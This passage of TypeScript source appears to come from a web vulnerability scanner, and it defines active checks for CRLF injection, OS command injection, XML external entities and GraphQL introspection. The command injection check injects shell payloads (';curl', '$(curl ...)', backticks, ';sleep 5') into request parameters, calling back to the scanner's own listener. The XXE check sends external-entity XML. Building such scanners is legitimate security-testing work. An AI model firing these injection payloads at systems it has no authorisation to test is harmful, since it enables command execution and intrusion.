          'value feeds, that is a forged Set-Cookie, a cache-poisoning key, or -- where a bare LF ' +
          'reaches the body -- response splitting.',
        remediation:
          'Strip or reject CR and LF in any value placed into a response header, after decoding. ' +
          'Most HTTP server libraries do this when the header is set through their API rather ' +
          'than by string concatenation; this bug usually means a header is being built by hand.',
        url: request.url,
        evidence: [found.exchangeId],
      });
    }

    return out;
  },
};

export const commandInjectionCheck: ActiveCheck = {
  id: 'AWB-A013',
  title: 'OS command injection',
  description:
    'Tries to make the server run a command that calls back to the workbench listener, ' +
    'and -- when there is no listener -- whether a sleep command delays the response ' +
    'beyond what the baseline variance explains.',
  costPerPoint: 4,
  needsOob: true,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];

    const candidates = points
      .filter(
        (p) =>
          p.kind !== 'header' &&
          (/cmd|command|exec|run|ping|host|ip|addr|target|domain|file|name|path|query|q$|search|url|action|func|option|arg|input|data/i.test(
            p.name,
          ) ||
            points.length <= 4),
      )
      .slice(0, 5);

    const listener = context.oob;
    if (listener !== undefined) {
      // The confident path: a command that fetches a unique URL. If the
      // listener records it, the server ran the command -- no guessing from
      // output, which is why this works on a blind injection.
      const pending: { point: InjectionPoint; token: string; exchangeId: string }[] = [];
      for (const point of candidates) {
        if (context.sender.requestsLeft < 1) break;
        const mark = listener.mint(`command injection via ${point.label}`);
        // One payload packs the separators that differ between shells, so a
        // candidate costs one request rather than one per separator.
        const payload =
          `${point.original};curl ${mark.url};` +
          `|curl ${mark.url}|` +
          `\`curl ${mark.url}\`` +
          `$(curl ${mark.url})` +
          `&curl ${mark.url}&`;
        const probe = await context.sender.send(inject(request, point, payload), this.id);
        pending.push({ point, token: mark.token, exchangeId: probe.exchange.id });
      }

      if (pending.length > 0) await sleep(6000);

      for (const entry of pending) {
        const interactions = listener.forToken(entry.token);
        if (interactions.length === 0) continue;
        out.push({
          check: this.id,
          title: `OS command injection in ${entry.point.label}`,
          severity: 'critical',
          confidence: 'certain',
          detail:
            `A command substitution placed in ${entry.point.label} caused the server to reach the ` +
            `workbench listener: ${interactions.map((i) => `${i.kind} from ${i.remoteAddress}`).join('; ')}. ` +
            'The value is passed to a shell. Arbitrary command execution follows from there.',
          remediation:
            'Do not pass user input to a shell. Call the program directly with an argument vector ' +
            '(execve, not system/popen), so there is no shell to interpret metacharacters, and ' +
            'validate the argument against an allow-list where the program itself is the risk.',
          url: request.url,
          evidence: [entry.exchangeId],
        });
      }
      if (out.length > 0) return out;
    }

    // The fallback when nothing is listening: a sleep, judged the same
    // conservative way as the time-based SQL check.
    const delaySeconds = 5;
    for (const point of candidates.slice(0, 2)) {
      if (context.sender.requestsLeft < 7) break;
      const baseline: TimingSample[] = [];
      for (let i = 0; i < 4; i += 1) {
        const r = await context.sender.send(inject(request, point, point.original), this.id);
        baseline.push({ elapsedMs: r.response?.elapsedMs ?? 0, status: r.response?.status });
      }
      const payload = `${point.original};sleep ${delaySeconds}`;
      const test: TimingSample[] = [];
      let lastExchange = '';
      for (let i = 0; i < 3; i += 1) {
        if (context.sender.requestsLeft < 1) break;
        const r = await context.sender.send(inject(request, point, payload), this.id);
        test.push({ elapsedMs: r.response?.elapsedMs ?? 0, status: r.response?.status });
        lastExchange = r.exchange.id;
      }
      const verdict = judgeTiming(baseline, test, delaySeconds * 1000);
      if (!verdict.delayed) continue;
      out.push({
        check: this.id,
        title: `OS command injection in ${point.label} (time-based)`,
        severity: 'critical',
        confidence: 'firm',
        detail:
          `A sleep command in ${point.label} delayed the response reproducibly. ${verdict.reason}.\n\n` +
          'No out-of-band listener was available, so this is a timing inference rather than a ' +
          'recorded callback; run the scan with `awb oob` for a definitive confirmation.',
        remediation:
          'Do not pass user input to a shell. Call the program directly with an argument vector.',
        url: request.url,
        evidence: [lastExchange],
      });
      break;
    }

    return out;
  },
};

export const xxeCheck: ActiveCheck = {
  id: 'AWB-A014',
  title: 'XML external entity',
  description:
    'For a request whose body is XML, declares an external entity pointing at the ' +
    'workbench listener and references it. A callback proves the parser resolved it.',
  costPerPoint: 2,
  needsOob: true,
  async run(request, _points, context) {
    const listener = context.oob;
    if (listener === undefined) return [];

    const ct = contentType(request.headers) ?? '';
    const bodyStart = request.body.toString('utf8').trimStart().slice(0, 64);
    const looksXml = /xml/.test(ct) || bodyStart.startsWith('<?xml') || /^<[a-zA-Z]/.test(bodyStart);
    if (!looksXml) return [];

    const mark = listener.mint(`XXE via ${request.method} ${request.url}`);
    // A general-entity form and a parameter-entity form: the first is blocked
    // by a parser that forbids general-entity expansion but the second is
    // not, and vice versa, so both are tried under one token.
    const payloads: readonly string[] = [
      `<?xml version="1.0"?><!DOCTYPE awb [<!ENTITY xxe SYSTEM "${mark.url}">]><awb>&xxe;</awb>`,
      `<?xml version="1.0"?><!DOCTYPE awb [<!ENTITY % xxe SYSTEM "${mark.url}"> %xxe;]><awb>x</awb>`,
    ];

    let lastExchange = '';
    for (const payload of payloads) {
      if (context.sender.requestsLeft < 1) break;
      const body = Buffer.from(payload, 'utf8');
      // The payload is one this check built, so its length is set rather than
      // preserved: without it the server frames an empty body and sees no XML.
      const headers = setHeader(request.headers, 'content-length', String(body.length));
      const probe = await context.sender.send({ ...request, headers, body }, this.id);
      lastExchange = probe.exchange.id;
    }

    const interactions = await listener.wait(mark.token, 6000);
    if (interactions.length === 0) return [];

    return [
      {
        check: this.id,
        title: 'XML external entity (XXE)',
        severity: 'high',
        confidence: 'certain',
        detail:
          `An XML body declaring an external entity caused the server to reach the workbench ` +
          `listener: ${interactions.map((i) => `${i.kind} from ${i.remoteAddress}`).join('; ')}. ` +
          'The XML parser resolves external entities, so it can be made to fetch URLs (a form of ' +
          'SSRF) and, with the right entity, to read local files.',
        remediation:
          'Disable DOCTYPE processing in the XML parser, or at least external entity and external ' +
          'DTD resolution. Every mainstream parser has a flag for this; the secure setting is ' +
          'rarely the default.',
        url: request.url,
        evidence: [lastExchange],
      },
    ];
  },
};

export const graphqlIntrospectionCheck: ActiveCheck = {
  id: 'AWB-A015',
  title: 'GraphQL introspection is enabled',
  description:
    'Sends an introspection query to an endpoint that looks like GraphQL and confirms ' +
    'the schema came back. An exposed schema is not itself a vulnerability but it hands ' +
    'an attacker the full attack surface.',
  costPerPoint: 1,
  async run(request, _points, context) {
    const url = request.url.toLowerCase();
    const bodyText_ = request.body.toString('utf8');
    const looksGraphql =
      /graphql|graphiql|\/gql\b/.test(url) ||
      (contentType(request.headers) === 'application/json' &&
        /"query"\s*:/.test(bodyText_) &&
        bodyText_.includes('{'));
    if (!looksGraphql) return [];

    const query = '{"query":"query awb{__schema{queryType{name} types{name kind}}}"}';
    const headers = setHeader(
      setHeader(request.headers, 'content-length', String(Buffer.byteLength(query))),
      'content-type',
      'application/json',
    );
    const probe = await context.sender.send(
      { ...request, method: 'POST', headers, body: Buffer.from(query, 'utf8') },
      this.id,
    );
    if (probe.response === undefined) return [];

    const text = bodyText(probe.response.headers, probe.response.body);
    // The query string itself contains "__schema", so matching that proves
    // nothing -- an endpoint that echoes the request back would pass. A real
    // introspection answer carries structure the query did not send: the
    // named query type, or the array of types. Require one of those.
    const answered = /"queryType"\s*:/.test(text) || /"types"\s*:\s*\[/.test(text);
    if (!answered) return [];

    return [
      {
        check: this.id,
        title: 'GraphQL introspection is enabled',
        severity: 'low',
        confidence: 'certain',
        detail:
          'An introspection query returned the schema: the response names the query type and the ' +
          'type list. Introspection lets any client enumerate every query, mutation, field and ' +
          'argument the API has, which turns a black-box target into a white-box one.',
        remediation:
          'Disable introspection in production, or gate it behind authentication. Note that ' +
          'disabling it is defence in depth, not access control -- the fields still exist and a ' +
          'determined attacker can guess them, so it does not substitute for authorising each one.',
        url: request.url,
        evidence: [probe.exchange.id],
      },
    ];
  },
};

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

export const ACTIVE_CHECKS: readonly ActiveCheck[] = [
  reflectionCheck,
  sqlInjectionCheck,
  templateInjectionCheck,
  openRedirectCheck,
  corsOriginCheck,
  pathTraversalCheck,
  ssrfCheck,
  hostHeaderCheck,
  methodTamperingCheck,
  authorisationDifferentialCheck,
  timeBasedInjectionCheck,
  crlfInjectionCheck,
  commandInjectionCheck,
  xxeCheck,
  graphqlIntrospectionCheck,
];

export function activeCheckById(id: string): ActiveCheck | undefined {
  return ACTIVE_CHECKS.find((c) => c.id.toUpperCase() === id.toUpperCase());
}

/** What a run will cost, before it starts. */
export function estimateCost(
  checks: readonly ActiveCheck[],
  pointCount: number,
): number {
  return checks.reduce((total, check) => total + check.costPerPoint * Math.max(1, pointCount), 0);
}
